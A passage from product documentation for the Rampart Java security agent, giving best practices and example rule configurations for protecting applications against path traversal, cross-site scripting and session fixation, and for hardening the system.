It is recommended not to enable the Open Redirect rule in blocking mode if the application depends on user-controlled server-side HTTP redirect operations to external domains. Consider enabling the rule in detect mode to monitor the server-side HTTP redirect behavior of the application and keep track of external redirects.

### References

- https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- https://cwe.mitre.org/data/definitions/601.html

## **Best Practices - Path Traversal & Local File Inclusion**

### Vulnerability Overview

Path Traversal (CWE-22 - CWE-40) is a vulnerability that occurs when user-controlled input is used to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory. When the software does not properly neutralize special elements within the pathname malicious input can cause the pathname to resolve to a location that is outside of the restricted directory.

Path Traversal vulnerabilities are also used by attackers to perform Local File Inclusion (also known as LFI) attacks.

### Recommended Security Controls

According to the OWASP​ and ​MITRE​ recommendations, to be protected against Path Traversal and Local File Inclusion, applications must:

1. Assume all input is malicious. Use an "accept known good" input validation strategy, i.e. use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications or transform it into something that does.
2. If user input cannot be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.

### How Rampart’s Protection Works

Rampart offers protection against Path Traversal and Local File Inclusion attacks via the `traversal` declaration in the Rampart Filesystem rule. This rule uses the tainting engine to track all user input, hooks into Java’s File API and monitors file system operations. When a file system operation occurs, the Rampart agent checks if the file system path contains user-controllable (tainted) characters that traverse the filesystem.

The `traversal(relative)` rule detects if user-controlled input is used to traverse the file system using relative file system sequences such as `..` that can resolve to a location that is outside of the current directory.

The `traversal(absolute)` rule detects if user-controlled input is used to traverse the file system using absolute file system sequences such as `/path/to/file` that can resolve to a location that is outside of the current directory.

By specifying `traversal()` without any parameters, the rule protects against both relative and absolute path traversal attacks.

By default, when no taint source is specified in the rule, the Path Traversal rule protects against attacks coming from HTTP requests. Users have the option to also enable protection against path traversal attacks coming from other sources such as relational databases and/or deserialization-based protocols such as RMI.

### Protective Action

When the Path Traversal rule is enabled in deny mode and a path traversal attack is identified, then the malicious file system operation is terminated and a Java exception is thrown back to the application, in accordance with the File API.

### Rule Applicability

The Path Traversal rule is applicable and can be safely enabled in all applications, apart from when applications depend on user-controlled file system paths that contain either relative or absolute file system sequences.

### Best Practices

It is recommended not to enable the Path Traversal rule in blocking mode if the application depends on traversing the filesystem with user-controlled inputs. Instead, consider enabling the rule in detect mode to monitor such operations.

### References

- https://owasp.org/www-community/attacks/Path_Traversal
- https://cwe.mitre.org/data/definitions/22.html

## **Best Practices - Cross Site Scripting (XSS)**

### Vulnerability Overview

Cross-Site Scripting (XSS) (CWE-79) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

The XSS flaw occurs when:

- Data enters a Web application through an untrusted source, most frequently a web request.
- The data is included in dynamic content that is sent to a web user without being validated for malicious content.

There are 2 main types of XSS vulnerabilities:

1. Reflected XSS attacks: where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the HTTP request.
2. Stored XSS attacks: where the injected script is permanently stored on the target servers, such as in a database.

### Recommended Security Controls

According to the OWASP​ and ​MITRE​ recommendations, to be protected against XSS applications must:

1. Understand the context in which the untrusted data is used and the encoding that is expected.
2. Use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

### How Rampart’s Protection Works

Rampart offers protection against XSS attacks via the `xss` feature in the Rampart HTTP rule. This rule uses the tainting engine to track all user input, hooks into the web application's Servlet API and monitors all the write operations to the HTTP response. When a servlet write operation occurs, the Rampart agent uses a streaming tainted HTML 5.0 lexer and checks if any sequence of user-controllable (tainted) characters mutate the HTML syntax.

By default, the XSS rule:

1. protects only against reflected XSS attacks (i.e. payloads coming from HTTP requests)
2. protects the HTTP responses of all HTTP endpoints that produce HTML responses

To enable protection against stored XSS attacks then the `input` declaration in the Rampart HTTP rule must be configured with the value “database”. For example: `input(database)`

To enable protection against both reflected and stored XSS attacks then the `input` declaration in the Rampart HTTP rule must be configured with the values “http” and “database”. For example: `input(http, database)`

In most cases, defining the above XSS rule would provide the required level of protection.

In addition, Rampart can also protect against attacks coming from deserialized data. For example, from protocols such as RMI, JMX and the XMLReader that are based on Java or XML deserialization. To enable protection against deserialized payloads, add the “deserialization“ value to the `input` declaration in the Rampart HTTP rule. For example: `input(http, database, deserialization)`

To enable XSS security control, the default XSS rule can be specified. In some rare cases, users might need to specify additional XSS rules. There are two main reasons for this:
- an application might produce HTTP responses whose output is HTML but the content-type is incorrectly set by the application. For example, the HTTP endpoint generates HTML but its content-type is XML.
- different HTTP endpoints might require different taint sources to be configured.

In such cases, users can define additional XSS rules and specify in each additional XSS rule the relative path of the HTTP endpoint for which XSS protection must be enforced and optionally the source of tainted data. For example:

```
app("XSS"):
  requires(version: Rampart/2.10)
  http("XSS Protection"):
    xss(html)
    response(paths: "/pathOne")
    input(database, deserialization)
    protect(message: "XSS attacked identified and blocked", severity: 7)
  endhttp
endapp
```

Finally, it is important to note that by default the XSS rule is enabled in a non-strict lexing mode. This means that the XSS rule allows certain user inputs to be injected (i.e. to mutate the HTML syntax). These certain inputs have been vetted as non-malicious and are only formatting. This allows common WYSIWYG editors and markup languages such as markdown to be used. This feature is also called Safe XSS Injection. To disable the safe injection feature and enable the strict lexing mode, use the `policy` option in the `xss` declaration. For example: `xss(html, options: {policy: strict})`

### Protective Action

When the XSS rule is enabled in deny mode and an XSS attack is identified, then the malicious HTTP output operation is terminated and no further writing to the HTTP response is allowed.

### Rule Applicability

The XSS rule is applicable and can be safely enabled for web applications that use the Servlet API to handle HTTP requests and responses.

Only reflected XSS and stored XSS for HTML is currently supported. Protection against pure JavaScript or CSS (Cascading Style Sheets) payloads are not yet supported.

### Best Practices

In most cases, defining the following XSS rule would provide the required level of protection:

```
app("XSS"):
  requires(version: Rampart/2.10)
  http("XSS Protection"):
    response()
    xss(html)
    input(http, database)
    protect(message: "XSS attacked identified and blocked", severity: Very-High)
  endhttp
endapp
```

### References

- https://cwe.mitre.org/data/definitions/79.html
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

## **Best Practices - System Hardening Against Common Vulnerabilities**

### Vulnerability Overview

In some situations, an attacker can escalate a particular security vulnerability to compromise the underlying server or other backend infrastructure. This is true for various security vulnerabilities that Rampart offers dedicated protection for, such as Path Traversal and XML External Entity (XXE) injection.

### How Rampart’s Protection Works

For a specific security vulnerability, whether there is a dedicated Rampart rule that targets the vulnerability or not, it is possible to significantly reduce the impact of the vulnerability by using Rampart's system hardening rules.

For example, by using the Rampart Filesystem rule (File I/O Security Feature) and the Rampart Socket rule (Socket Control Security Feature) it is possible to harden the system and prohibit the vulnerable application from accessing unwanted resources.

### Protective Action

When a filesystem or network resource is accessed that is not allowed by a Filesystem or Socket rule then the IO operation is terminated and an exception is thrown according to the operation’s API.

### Rule Applicability

The Filesystem and Socket rules can be enabled on any Java application.

### Best Practices

To correctly enable the Filesystem and Socket rules in an environment, users must first understand the filesystem and network activity patterns of the application. Identify the resources that are required to be accessed by the application and then define Filesystem and Socket rules to whitelist these resources accordingly.

## **Best Practices - Session Fixation**

### Vulnerability Overview

Session Fixation (CWE-384) permits an attacker to hijack a valid user session. Authenticating a user or establishing a new user session without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.

The flaw occurs when the HTTP Session ID remains the same before and after a user logs-in. This permits an attacker to “fix” a specific Session ID and hijack a valid user session. In other words, the Session ID can be controlled by the attacker.

### Recommended Security Controls

According to the OWASP​ and ​MITRE​ recommendations, to be protected against Session Fixation, applications must:

1. Invalidate any existing session identifiers prior to authorizing a new user session
2. Regenerate the session ID after any privilege level change within the associated user session

The most common scenario where the Session ID regeneration is mandatory is during the authentication process, as the privilege level of the user changes from the unauthenticated (or anonymous) state to the authenticated state.

### How Rampart’s Protection Works

Rampart offers protection against Session Fixation attacks via the Rampart http rule using the following declarations:

```
http("Enable Session Fixation protection"):
request()
authenticate(user)
protect(http-session: regenerate-id)
endhttp
```

This rule hooks into the session authentication mechanism of the Servlet API and monitors user authentication processes. When a user successfully authenticates then the Rampart agent regenerates the Session ID of the user’s HTTP Session. This proactive security control remediates the vulnerability and eliminates the attack surface for Session Fixation attacks. Because no Session Fixation attacks are possible, this rule does not log any security events for attacks.

The following is a high-level description of the Session ID regeneration workflow that Rampart performs:

1. User enters correct credentials.
2. System successfully authenticates the user.
3. Existing HTTP session content is moved to temporary cache.
4. Existing HTTP session is invalidated (`HttpSession.invalidate()`).
5. A new HTTP session is created for the user.
6. The previously cached session data is restored into the newly created HTTP session.
7. The user goes to a successful login landing page using a new Session ID.

### Protective Action

The Session Fixation rule is a proactive rule. It is triggered proactively before a potential attack and eliminates the attack vector for Session Fixation.

### Rule Applicability

The Session Fixation rule is applicable and can be safely enabled in web applications:

- That use the Servlet API to handle HTTP requests, responses and session management.
- Whose authentication management system sets authentication and identity information on every HTTP request.
- Whose authentication mechanism sets the HttpServletRequest user Principal after authentication.

Users should not enable the Session Fixation rule in the following cases as it could either provide no protection or break the normal application functionality:

- In the very rare case where the target web application depends on having the same HTTP Session ID before and after the user authentication.
- If there is another security control in place that also regenerates the HTTP Session ID as it might cause conflicts.

### Best Practices

It is recommended to also enable the XSS security rule in blocking mode to be protected against XSS attacks. Applications vulnerable to XSS attacks are still vulnerable to Session Fixation or Session Hijacking attacks even if the Session Fixation rule is enabled.

### References

- https://owasp.org/www-community/attacks/Session_fixation
- https://cwe.mitre.org/data/definitions/384.html
